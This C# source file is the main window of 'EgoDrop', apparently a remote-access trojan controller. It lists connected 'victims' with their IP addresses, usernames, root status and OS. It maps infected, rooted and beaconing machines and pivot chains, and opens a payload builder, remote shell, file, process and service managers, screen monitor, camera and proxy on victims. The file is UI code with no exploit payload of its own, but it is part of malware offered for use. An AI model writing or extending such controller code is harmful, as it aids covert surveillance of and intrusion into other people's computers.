using EgoDrop.Properties;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Resources;

namespace EgoDrop
{
    public partial class frmMain : Form
    {
        public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();

        private clsSqlite m_sqlite { get; set; } //Sqlite object.
        private clsIniMgr m_iniMgr { get; set; } //IniMgr object.

        public frmMain()
        {
            InitializeComponent();

            m_sqlite = new clsSqlite("data.db"); //Sqlite object.
            m_iniMgr = new clsIniMgr("config.ini"); //IniMgr object.
        }

        #region FindVictim

        /// <summary>
        /// Obtain victim object from listviewitem object.
        /// </summary>
        /// <param name="item"></param>
        /// <returns>Victim object.</returns>
        private clsVictim fnGetVictimFromTag(ListViewItem item) => item.Tag == null ? null : (clsVictim)item.Tag; //Obtain victim object.

        /// <summary>
        /// Obtain victim object from listview through ID.
        /// </summary>
        /// <param name="szID">Victim's ID.</param>
        /// <returns>Victim object.</returns>
        private clsVictim fnGetVictimWithID(string szID)
        {
            ListViewItem item = listView1.FindItemWithText(szID);
            return item == null ? null : (clsVictim)item.Tag;
        }

        /// <summary>
        /// Obtain victim's ID from listviewitem.
        /// </summary>
        /// <param name="item">ListViewItem</param>
        /// <returns>Victim object.</returns>
        private string fnszGetVictimID(ListViewItem item) => item.SubItems[1].Text;

        #endregion

        #region Logger

        /// <summary>
        /// Display log message and write into database.
        /// </summary>
        /// <param name="szMsg">Log message.</param>
        public void fnSysLog(string szMsg)
        {
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
            richTextBox1.AppendText(Environment.NewLine);

            //todo: Write log msg into database.
        }

        #endregion

        /// <summary>
        /// New victim event handler.
        /// </summary>
        /// <param name="ltn"></param>
        /// <param name="vic"></param>
        public void fnOnNewVictim(clsListener ltn, clsVictim vic)
        {
            Socket sktClnt = vic.m_sktClnt;
            try
            {
                Invoke(new Action(() =>
                {
                    //Add to group,
                }));
            }
            catch (Exception ex)
            {

            }
        }

        /// <summary>
        /// New received victim message event handler.
        /// </summary>
        /// <param name="ltn">Listener object.</param>
        /// <param name="victim">Victim object.</param>
        /// <param name="lsMsg">Message list.</param>
        public void fnReceivedMessage(clsListener ltn, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            if (lsMsg.Count == 0)
                return;

            if (victim == null || victim.m_sktClnt == null || victim.m_sktClnt.RemoteEndPoint == null)
                return;

            Invoke(new Action(() =>
            {
                if (lsMsg[0] == "info")
                {
                    string szID = lsMsg[4];
                    if (listView1.Items.Count == 0 || listView1.FindItemWithText(szID, true, 0) == null)
                    {
                        string szIpExt = victim.m_sktClnt.RemoteEndPoint.ToString();

                        ListViewItem item = new ListViewItem(lsMsg[1]); //Screen (sudo required!).
                        item.SubItems.Add(szID);                        //Victim ID.
                        item.SubItems.Add(szIpExt);                     //External IPv4 address.
                        item.SubItems.Add(lsMsg[3]);                    //Internal IPv4 address.
                        item.SubItems.Add(lsMsg[5]);                    //Username.
                        item.SubItems.Add(lsMsg[6]);                    //uid.
                        item.SubItems.Add(lsMsg[7]);                    //root?
                        item.SubItems.Add(lsMsg[8]);                    //Operating system.
                        item.SubItems.Add(string.Empty);                //Active window title (if not null or empty).

                        item.Tag = victim;

                        listView1.Items.Add(item);

                        fnSysLog($"New victim[{szID}]"); //Write new log message.

                        //todo: Add to group treeview.

                    }
                }
                else if (lsMsg[0] == "server")
                {
                    if (lsMsg[1] == "start")
                    {
                        int nCode = int.Parse(lsMsg[2]);
                        string szMsg = lsMsg[3];

                        if (nCode == 1)
                        {
                            Node node = networkView1.FindNodeWithID(szSrcVictimID);
                            if (node == null)
                            {
                                clsTools.fnShowErrMsgbox("Node is null.");
                                return;
                            }

                            //Change machine status.
                            switch (node.MachineStatus)
                            {
                                case NetworkView.enMachineStatus.Linux_Infected:
                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
                                    break;
                                case NetworkView.enMachineStatus.Linux_Super:
                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
                                    break;
                                case NetworkView.enMachineStatus.Windows_Infected:
                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
                                    break;
                                case NetworkView.enMachineStatus.Windows_Super:
                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
                                    break;
                            }
                        }
                        else
                        {
                            clsTools.fnShowErrMsgbox(szMsg, "Pivoting");
                        }
                    }
                    else if (lsMsg[1] == "stop")
                    {
                        int nCode = int.Parse(lsMsg[2]);
                        string szMsg = lsMsg[3];

                        if (nCode == 1)
                        {
                            Node node = networkView1.FindNodeWithID(szSrcVictimID);
                            ListViewItem item = listView1.FindItemWithText(szSrcVictimID, true, 0);

                            if (item == null)
                                return;

                            bool bRoot = string.Equals(item.SubItems[6].Text, "1");

                            switch (node.MachineStatus)
                            {
                                case NetworkView.enMachineStatus.Linux_Beacon:
                                    networkView1.fnSetMachineStatus(node, bRoot ? NetworkView.enMachineStatus.Linux_Super : NetworkView.enMachineStatus.Linux_Infected);
                                    break;
                                case NetworkView.enMachineStatus.Windows_Beacon:
                                    networkView1.fnSetMachineStatus(node, bRoot ? NetworkView.enMachineStatus.Windows_Super : NetworkView.enMachineStatus.Windows_Infected);
                                    break;
                            }
                        }
                        else
                        {
                            clsTools.fnShowErrMsgbox(szMsg, "Pivoting");
                        }
                    }
                }
                else if (lsMsg[0] == "disconnect")
                {
                    fnOnVictimDisconnected(ltn, victim, szSrcVictimID);
                }
            }));
        }

        /// <summary>
        /// Victim disconnected event handler.
        /// </summary>
        /// <param name="ltn">Listener object.</param>
        /// <param name="vic">Victim object.</param>
        public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic, string szVictimID)
        {
            TreeNode fnFindNode(string szID, TreeNode nodeParent = null)
            {
                foreach (TreeNode node in nodeParent == null ? treeView2.Nodes : nodeParent.Nodes)
                {
                    if (string.Equals(node.Text, szID))
                    {
                        return node;
                    }
                    else
                    {
                        return fnFindNode(szID, node);
                    }
                }

                return nodeParent;
            }

            if (vic == null || vic.m_sktClnt == null || vic.m_sktClnt.RemoteEndPoint == null)
                return;

            Invoke(new Action(() =>
            {
                //Remove from listview.
                foreach (ListViewItem item in listView1.Items)
                {
                    if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)))
                    {
                        listView1.Items.Remove(item);
                        fnSysLog($"Offline[{szVictimID}]");
                    }
                }

                //Remove from treeview.
                TreeNode tNode = fnFindNode(szVictimID);
                treeView2.Nodes.Remove(tNode);

                //Remove from networkview.
                Node node = networkView1.FindNodeWithID(szVictimID);
                networkView1.RemoveNode(node);

                Node firewallNode = networkView1.FindNodeWithName($"Firewall@{vic.m_sktClnt.RemoteEndPoint}");
                if (firewallNode.ChildNodes.Count == 0)
                    networkView1.RemoveNode(firewallNode);
            }));
        }

        /// <summary>
        /// Add victim chain.
        /// </summary>
        /// <param name="lsVictim"></param>
        public void fnOnAddChain(List<string> lsVictim, string szOS, string szUsername, bool bRoot, string szIPv4)
        {
            NetworkView.enMachineStatus fnGetStatusFromOS(string szOS)
            {
                szOS = szOS.ToLower();

                string[] asWindows = new string[]
                {
                    "windows",
                };
                string[] asLinux = new string[]
                {
                    "linux",
                    "ubuntu",
                    "freebsd",
                    "centos",
                    "debian",
                };

                foreach (string s in asWindows)
                {
                    if (szOS.Contains(s))
                    {
                        return NetworkView.enMachineStatus.Windows_Infected;
                    }
                }
                foreach (string s in asLinux)
                {
                    if (szOS.Contains(s))
                    {
                        return NetworkView.enMachineStatus.Linux_Infected;
                    }
                }

                return NetworkView.enMachineStatus.Unknown;
            }
            void fnAddTreeView(List<string> lsVictim, NetworkView.enMachineStatus status, TreeNode nodeParent = null)
            {
                TreeNode node = null;
                foreach (TreeNode n in nodeParent == null ? treeView2.Nodes : nodeParent.Nodes)
                {
                    if (string.Equals(n.Text, lsVictim.First()))
                    {
                        node = n;
                        break;
                    }
                }

                if (node == null)
                {
                    node = new TreeNode(lsVictim.First());
                    node.ImageKey = Enum.GetName(status);

                    if (nodeParent == null)
                    {
                        treeView2.Nodes.Add(node);
                    }
                    else
                    {
                        nodeParent.Nodes.Add(node);
                        nodeParent.Expand();

                        nodeParent.EnsureVisible();
                    }
                }

                if (lsVictim.Count == 1)
                    return;

                fnAddTreeView(lsVictim[1..], status, node);
            }

            Invoke(new Action(() =>
            {
                try
                {
                    for (int i = 0; i < lsVictim.Count; i++)
                    {
                        string szVictim = lsVictim[i];

                        if (networkView1.FindNodeWithID(szVictim) != null)
                        {
                            continue;
                        }

                        var status = fnGetStatusFromOS(szOS);
                        if (bRoot)
                        {
                            if (status == NetworkView.enMachineStatus.Linux_Infected)
                                status = NetworkView.enMachineStatus.Linux_Super;
                            else if (status == NetworkView.enMachineStatus.Windows_Infected)
                                status = NetworkView.enMachineStatus.Windows_Super;
                        }

                        var n1 = networkView1.AddNode($"{szVictim}", $"{szUsername}@{szVictim}\n{szIPv4}", status);

                        clsVictim victim = fnGetVictimWithID(szVictim);
                        victim.fnAddVictimChain(szVictim, lsVictim[..(i + 1)]);

                        fnAddTreeView(lsVictim, status);

                        if (i == 0)
                        {
                            string szName = $"Firewall@{victim.m_sktClnt.RemoteEndPoint.ToString()}";
                            if (networkView1.FindNodeWithName(szName) == null)
                            {
                                var fireWall = networkView1.AddNode(szName, szName, NetworkView.enMachineStatus.Firewall);
                                networkView1.AddConnection(fireWall, n1);
                                networkView1.MoveNodeToLeft(fireWall);
                                networkView1.BringGraphIntoView();
                            }

                            continue;
                        }

                        var nodeParent = networkView1.FindNodeWithID(lsVictim[i - 1]);
                        networkView1.AddConnection(nodeParent, n1);
                    }
                }
                catch (Exception ex)
                {
                    clsTools.fnShowErrMsgbox(ex.Message);
                }
            }));
        }

        private void fnSetup()
        {
            //Load groups
            List<string> lsGroup = m_sqlite.fnlsGetGroups();
            foreach (string szName in lsGroup)
            {
                TreeNode node = new TreeNode(szName);
                treeView1.Nodes.Add(node);
            }

            networkView1.imageList = imageList1;

            ImageList smallImageList = new ImageList();
            foreach (string szKey in imageList1.Images.Keys)
                smallImageList.Images.Add(szKey, imageList1.Images[szKey]);

            smallImageList.ImageSize = new Size(30, 30);

            treeView2.ImageList = smallImageList;

            networkView1.Zoom = 1.0f;
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Listener
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmListener f = new frmListener(this, m_sqlite, m_dicListener);

            f.ShowDialog();
        }

        //Builder
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            frmBuilder f = new frmBuilder(this, m_sqlite, m_iniMgr);
            f.Show();
        }

        //Setting
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            frmSetting f = new frmSetting(m_iniMgr);

            f.ShowDialog();
        }

        //About
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            new frmAbout().Show();
        }

        //Info
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string szVictimID = fnszGetVictimID(item);
                frmInfoSpyder f = new frmInfoSpyder(szVictimID, fnGetVictimFromTag(item));
                f.Show();
            }
        }

        //File
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string szVictimID = fnszGetVictimID(item);
                clsVictim victim = fnGetVictimFromTag(item);
                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szVictimID);
                if (f == null)
                {
                    f = new frmFileMgr(szVictimID, victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Process
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string szVictimID = fnszGetVictimID(item);
                clsVictim victim = fnGetVictimFromTag(item);
                frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(victim, szVictimID);
                if (f == null)
                {
                    f = new frmProcMgr(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Service
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string szVictimID = fnszGetVictimID(item);
                clsVictim victim = fnGetVictimFromTag(item);
                frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(victim, szVictimID);
                if (f == null)
                {
                    f = new frmSrvMgr(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Monitor
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmMonitor f = new frmMonitor(fnGetVictimFromTag(item));

                f.Show();
            }
        }

        //Camera
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmCamera f = new frmCamera();

                f.Show();
            }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string szVictimID = fnszGetVictimID(item);
                clsVictim victim = fnGetVictimFromTag(item);
                frmShell f = clsTools.fnFindForm<frmShell>(victim, szVictimID);
                if (f == null)
                {
                    f = new frmShell(victim);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            Node node = networkView1.SelectedNode;
            if (node == null)
                return;

            string szID = node.szVictimID;
            if (string.IsNullOrEmpty(szID))
                return;

            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
            if (item == null)
                return;

            clsVictim victim = fnGetVictimFromTag(item);

            frmServerProxy f = new frmServerProxy(szID, victim);
            f.Show();
        }

        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            Node node = networkView1.SelectedNode;
            if (node == null)
                return;

            string szID = node.szVictimID;
            clsVictim victim = fnGetVictimWithID(szID);
            if (victim == null)
                return;

            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szID);
            if (f == null)
            {
                f = new frmFileMgr(szID, victim);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }
        }

        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            frmGroup f = new frmGroup(this, m_sqlite);
            f.ShowDialog();

            var ls = m_sqlite.fnlsGetGroups();
        }

        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeView2.SelectedImageKey = treeView2.SelectedNode.ImageKey;
        }
    }
}
